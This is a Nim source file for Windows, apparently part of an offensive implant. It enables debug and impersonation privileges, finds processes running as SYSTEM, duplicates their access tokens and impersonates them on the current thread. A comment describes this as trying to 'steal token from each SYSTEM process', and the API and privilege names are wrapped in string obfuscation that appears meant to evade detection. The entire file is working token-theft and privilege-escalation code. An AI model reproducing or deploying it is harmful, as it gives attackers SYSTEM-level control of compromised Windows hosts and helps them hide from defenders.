import nimprotect
import winim/com
import winim
import priv

var systemSID = protectString("S-1-5-18")

proc ConvertSidToStringSidA(Sid: PSID, StringSir: ptr LPSTR): NTSTATUS {.cdecl, importc: protectString("ConvertSidToStringSidA"), dynlib: protectString("Advapi32.dll").}


proc sid_to_string(sid: PSID): string =
    var lpSid: LPSTR
    discard ConvertSidToStringSidA(sid, addr lpSid)
    return $cstring(lpSid)


proc is_process_system(pid: int): bool =
    
    # inits
    var hProcess: HANDLE
    var hToken: HANDLE
    var pUser: TOKEN_USER
    var dwLength: DWORD
    var dwPid = cast[DWORD](pid)
    
    # open process
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid)
    if hProcess == cast[DWORD](-1) or hProcess == cast[DWORD](NULL):
        return false
    
    # open process token
    if OpenProcessToken(hProcess, TOKEN_QUERY, cast[PHANDLE](hToken.addr)) == FALSE:
        CloseHandle(hProcess)
        return false

    if hToken == cast[HANDLE](-1) or hToken == cast[HANDLE](NULL):
        CloseHandle(hProcess)
        return false
    
    # get required buffer size and allocate the TOKEN_USER buffer
    GetTokenInformation(hToken, tokenUser, cast[LPVOID](pUser.addr), cast[DWORD](0), cast[PDWORD](dwLength.addr))
    
    # extract token information
    GetTokenInformation(hToken, tokenUser, pUser.addr, cast[DWORD](dwLength), cast[PDWORD](dwLength.addr))

    # extract the SID from the token and compare with SYSTEM
    if sid_to_string(pUser.User.Sid) == systemSID:
        return true
    
    CloseHandle(hToken)
    CloseHandle(hProcess)
    return false


proc impersonate*(pid: int): (bool, string) =
    
    # inits
    var is_success: BOOL
    var hProcess: HANDLE
    var hToken: HANDLE
    var newToken: HANDLE
    var username: string

    # enable SeDebugPrivilege
    if not set_privilege(protectString("SeDebugPrivilege")):
        return (false, "")

    if not set_privilege(protectString("SeImpersonatePrivilege")):
        return (false, "")

    # open process
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_DUP_HANDLE, TRUE, pid.DWORD)
    if hProcess == 0:
        return (false, "")

    # open process token
    is_success = OpenProcessToken(hProcess, TOKEN_QUERY or TOKEN_DUPLICATE, addr hToken)
    if is_success == FALSE:
        CloseHandle(hProcess)
        return (false, "")

    # duplicate process token
    is_success = DuplicateTokenEx(hToken, TOKEN_QUERY or TOKEN_IMPERSONATE, nil, securityImpersonation, tokenImpersonation, addr newToken)
    if bool(is_success) == FALSE:
        CloseHandle(hToken)
        CloseHandle(hProcess)
        return (false, "")

    # impersonate user
    var thread_h = GetCurrentThread()
    is_success = SetThreadToken(addr thread_h, newToken)
    if is_success == FALSE:
        CloseHandle(hProcess)
        CloseHandle(hToken)
        CloseHandle(newToken)
        return (false, "")
    
    username = CreateObject(protectString("WScript.Network")).userName
    
    # cleanup
    CloseHandle(hProcess)
    CloseHandle(hToken)
    CloseHandle(newToken)
    return (true, username)
    

proc impersonate_system*(): bool =

    # inits
    var entry: PROCESSENTRY32
    var hSnapshot: HANDLE
    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    var is_success: bool
    var username: string

    # enable SeDebugPrivilege
    if not set_privilege(protectString("SeDebugPrivilege")):
        return false      

    # get all processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if Process32First(hSnapshot, addr entry):
        # iterate all processes and try to steal token from each SYSTEM process
        while Process32Next(hSnapshot, addr entry):
            try:
                if is_process_system(entry.th32ProcessID):
                    (is_success, username) = impersonate(entry.th32ProcessID)
                    if is_success:
                        CloseHandle(hSnapshot)
                        return true
            except:
                continue
    CloseHandle(hSnapshot)
    return false


proc rev2self*(): bool =
        
    if RevertToSelf():
        return true
    else:
        return false
